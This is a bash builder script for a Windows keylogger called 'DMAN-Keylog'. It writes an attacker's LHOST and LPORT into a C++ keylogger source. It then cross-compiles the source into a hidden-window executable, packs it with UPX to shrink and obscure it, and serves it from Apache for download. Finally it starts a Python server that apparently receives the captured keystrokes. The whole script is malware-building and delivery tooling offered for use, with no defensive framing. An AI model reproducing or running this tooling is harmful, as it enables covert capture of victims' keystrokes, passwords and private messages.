#!/bin/bash

# Function to display the banner
display_banner() {
  echo -e "\e[92m#################################################\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#                \e[91mDMAN-Keylog\e[92m                    #\e[0m"
  echo -e "\e[92m#                                               #\e[0m"
  echo -e "\e[92m#################################################\e[0m"
 
}

# Default values
LHOST="127.0.0.1"
LPORT="9999"

# Function to show options
show_options() {
  echo -e "\e[93mDefault Options:\e[0m"
  echo "LHOST: $LHOST"
  echo "LPORT: $LPORT"
  echo -e "\e[93mTo set LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
  echo -e "\e[93mTo set LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
  echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
}

# Function to compile and set up keylogger
generate_keylogger() {
  echo "Updating C++ code with the provided LHOST and LPORT..."
  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp
  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" keylogger.cpp

  echo "Compiling the C++ code..."
  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32 -mwindows

  echo "Packing the executable with UPX..."
  upx --best --lzma keylogger.exe

  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"

  echo "Moving the keylogger executable to the Apache server directory..."
  sudo mv keylogger.exe /var/www/html/

  echo "Starting Apache server..."
  sudo systemctl start apache2

  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
}

# Function to start the Python server
start_server() {
  echo "Running the Python server..."
  python3 server.py
}

# Ensure the system is updated and install necessary packages
echo "Updating system and installing necessary packages..."
sudo apt-get update
sudo apt-get install -y mingw-w64 python3 apache2 git upx

# Display the banner
display_banner

while true; do
  echo -e "\e[92m1. Show options\e[0m"
  echo -e "\e[92m2. Start server\e[0m"
  echo -e "\e[92m3. Exit\e[0m"
  echo -e "\e[93mSelect an option:\e[0m"
  read OPTION

  case $OPTION in
    1)
      show_options
      while true; do
        read INPUT
        if [[ $INPUT == "generate" ]]; then
          generate_keylogger
          break
        elif [[ $INPUT == set\ LHOST=* ]]; then
          LHOST=${INPUT#*=}
          echo "LHOST set to $LHOST"
        elif [[ $INPUT == set\ LPORT=* ]]; then
          LPORT=${INPUT#*=}
          echo "LPORT set to $LPORT"
        else
          echo "Invalid input. Type 'generate' to compile or 'set LHOST=<IP_ADDRESS>' or 'set LPORT=<PORT_NUMBER>' to set options."
        fi
      done
      ;;
    2)
      start_server
      ;;
    3)
      echo "Exiting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please select 1, 2, or 3."
      ;;
  esac
done
